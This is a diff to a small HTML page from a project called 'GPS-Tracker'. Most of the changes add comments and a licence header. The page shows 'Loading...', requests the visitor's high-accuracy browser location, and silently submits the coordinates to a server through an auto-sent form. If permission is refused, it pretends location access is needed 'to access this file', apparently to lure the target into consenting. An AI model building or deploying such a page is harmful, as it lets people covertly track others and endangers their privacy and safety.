@@ -1,3 +1,9 @@
+<!--
+    **GPS-Tracker**
+  @Author -> Sun Podder
+  @github.com/SunPodder/gps-tracker
+  @License: MIT License
+-->
 <!DOCTYPE html>
 <html>
 <head>
@@ -18,15 +24,16 @@ Loading...
 <script type="text/javascript">
 
 function getLocation() {
+  //checks if the browser supports Geolocation
   if (navigator.geolocation) {
-    //checks if the browser supports Geolocation
+    //if browser supports Geolocation, gets location data and sends to server
     navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
   } else {
     document.write("Geolocation is not supported by this browser.");
   }
 }
 
-//if browser supports Geolocation and everything is OK takes user location and sends to server
+//callback function. If Geolocation call is successful executes this function
 function showPosition(position) {
   document.getElementById("lat").value = position.coords.latitude
   document.getElementById("long").value = position.coords.longitude
@@ -34,12 +41,14 @@ function showPosition(position) {
   document.getElementById("form").submit()
 }
 
-//calls this function if any error occurs 
+//callback function. If Geolocation call is failed executes this function
 function onErr(err){
   alert("Please reload the webpage and give location permission to use this site")
   document.write(err.message+"<br>Please reload the webpage and give location permission to access this file...<br><br>")
 }
 
+//Geolocation additional options. 
+//High Accuracy is enabled for precious location
 const options = {
   enableHighAccuracy: true
   }
